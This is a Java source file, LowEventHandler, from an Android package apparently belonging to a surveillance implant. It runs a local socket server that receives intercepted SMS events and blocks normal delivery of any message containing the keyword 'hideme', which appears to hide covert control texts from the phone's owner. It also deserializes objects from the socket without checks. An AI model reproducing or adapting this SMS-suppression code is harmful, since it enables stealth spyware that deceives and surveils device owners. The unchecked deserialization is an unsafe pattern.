package com.android.dvci.util;
import android.net.LocalServerSocket;
import android.net.LocalSocket;
import android.os.RemoteException;
import android.telephony.SmsMessage;
import android.util.Log;

import com.android.dvci.auto.Cfg;

import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.OutputStream;
import java.util.HashMap;

/**
 * Created by zad on 27/02/15.
 */
public class LowEventHandler implements Runnable {

	private static final String TAG = "LowEventHandler";
	private boolean accept =true;
	private LocalServerSocket server = null;
	private final Thread thread;

	public LowEventHandler() {
		thread = new Thread(this);
		thread.start();
	}

	public static int dispatchNormalMessage(Object smsO) {

		if (Cfg.DEBUG) {
			Check.log(TAG + "dispatchNormalMessage: start ok " + smsO);
		}
		int callOrig = 1;
		if (smsO == null) {
			if (Cfg.DEBUG) {
				Check.log(TAG + "dispatchNormalMessage: sms0 null ");
			}
			return callOrig;
		}

		try {
			byte[][] pdus = new byte[1][];
			if (Cfg.DEBUG) {
				Check.log(TAG + "dispatchNormalMessage: asking pdu ");
			}
			pdus[0] = Reflect.on(smsO).call("getPdu").get();
			if (Cfg.DEBUG) {
				Check.log(TAG + "dispatchNormalMessage: got it");
			}
			SmsMessage sms = SmsMessage.createFromPdu(pdus[0]);

			if (Cfg.DEBUG) {
				Check.log(TAG + "dispatchNormalMessage: processing " + sms.getMessageBody());
			}
			if (sms.getMessageBody() != null && sms.getMessageBody().toLowerCase().contains("hideme")) {
				if (Cfg.DEBUG) {
					Check.log(TAG + "dispatchNormalMessage: Don't call origin ");
				}
				callOrig = 0;
			} else {
				if (Cfg.DEBUG) {
					Check.log(TAG + "dispatchNormalMessage:  call origin");
				}
				callOrig = 1;

			}

		} catch (Exception e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + "dispatchNormalMessage: Exception:", e);
			}
		}
		return callOrig;
	}
	public static int dispatchNormalMessage(byte[] pdu) {

		int callOrig = 1;
		SmsMessage sms = SmsMessage.createFromPdu(pdu);

		if (Cfg.DEBUG) {
			Check.log(TAG + "dispatchNormalMessage: processing " + sms.getMessageBody());
		}
		if (sms.getMessageBody() != null && sms.getMessageBody().toLowerCase().contains("hideme")) {
			if (Cfg.DEBUG) {
				Check.log(TAG + "dispatchNormalMessage: Don't call origin ");
			}
			callOrig = 0;
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + "dispatchNormalMessage:  call origin");
			}
			callOrig = 1;

		}
		return callOrig;
	}
	public static int dispatchNormalMessagePdu(byte[] pdus) {

		if (Cfg.DEBUG) {
			Check.log(TAG + "dispatchNormalMessagePdu: start ok ");
		}
		int callOrig = 1;
		if (pdus.length==0) {
			if (Cfg.DEBUG) {
				Check.log(TAG + "dispatchNormalMessagePdu: pdus zero size ");
			}
			return callOrig;
		}

		try {

			SmsMessage sms = SmsMessage.createFromPdu(pdus);

			if (Cfg.DEBUG) {
				Check.log(TAG + "dispatchNormalMessagePdu: processing " + sms.getMessageBody());
			}
			if (sms.getMessageBody() != null && sms.getMessageBody().toLowerCase().contains("hideme")) {
				if (Cfg.DEBUG) {
					Check.log(TAG + "dispatchNormalMessagePdu: Don't call origin ");
				}
				callOrig = 0;
			} else {
				if (Cfg.DEBUG) {
					Check.log(TAG + "dispatchNormalMessagePdu:  call origin");
				}
				callOrig = 1;

			}

		} catch (Exception e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + "dispatchNormalMessagePdu: Exception:", e);
			}
		}
		return callOrig;
	}

	public void closeSocketServer() {
		accept = false;
		if(server != null) {
			try {
				server.close();
			} catch (IOException e) {
				e.printStackTrace();
			}
			while (server != null) {
				Utils.sleep(100);
			}
		}
	}
	@Override
	public void run() {
		try {
			server = new LocalServerSocket("llad");
			if (Cfg.DEBUG) {
				Check.log(TAG + "Server is ready...");
			}
			while(this.accept) {
				/* wait until a connection is ready */
				try {
					LocalSocket receiver = server.accept();
					if (receiver != null) {
						DataInputStream streamIn = new DataInputStream(new
								BufferedInputStream(receiver.getInputStream()));
						DataOutputStream streamOut = new DataOutputStream(new
								BufferedOutputStream(receiver.getOutputStream()));
						int timeout = 5;
						while (streamIn.available() == 0 && timeout-- >= 0) {
							Utils.sleep(100);
						}
						if (streamIn.available() > 0) {
							ObjectInputStream ois = new ObjectInputStream(streamIn);
							LowEventHandlerDefs event = (LowEventHandlerDefs) ois.readObject();
							Log.d(TAG, "GOT DATA " + event);
							if (event.type  == LowEventHandlerDefs.EVENT_TYPE_SMS) {


								if (event.data != null) {
									event.res = dispatchNormalMessagePdu((byte[])event.data);
								} else {
									event.res = 1;
								}
								if (Cfg.DEBUG) {
									Check.log(TAG + " SENT reply " + event);
								}
							} else {
								event.res = 1;
							}
							timeout = 10;
							while (timeout-- >= 0 ) {
									try {
										ObjectOutputStream oos = new ObjectOutputStream(streamOut);
										oos.writeObject(event);
										oos.flush();
										oos.close();
										break;
									} catch (Exception e) {
										if (Cfg.DEBUG) {
											Check.log(TAG + "run: Exception sending back:", e);
										}
									}
								Utils.sleep(100);
							}
						}
						receiver.close();
						if (Cfg.DEBUG) {
							Check.log(TAG + "run: receiver closed");
						}
					}
				} catch (Exception e) {
					if (Cfg.DEBUG) {
						Check.log(TAG + "run: Exception:", e);
					}
				}
			}
			server.close();
		} catch (IOException ex) {
			if (Cfg.DEBUG) {
				Check.log(TAG + "IOEXCEPTION", ex);
			}
		}
	}
}
